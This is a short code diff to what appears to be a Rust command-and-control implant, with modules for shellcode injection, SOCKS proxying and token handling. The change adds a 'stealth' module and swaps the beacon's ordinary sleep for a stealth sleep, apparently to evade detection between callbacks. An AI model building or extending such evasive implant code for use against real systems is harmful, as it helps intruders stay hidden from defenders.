@@ -43,6 +43,7 @@ mod shell;
 mod shinject;
 mod sleep;
 mod socks;
+mod stealth;
 mod ssh;
 mod tasking;
 mod token;
@@ -134,7 +135,7 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Calculate the sleep time and sleep the agent
         let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
-        std::thread::sleep(std::time::Duration::from_secs(sleeptime));
+        crate::stealth::do_stealth_sleep(sleeptime);
 
         // Increment the current attempt
         tries += 1;
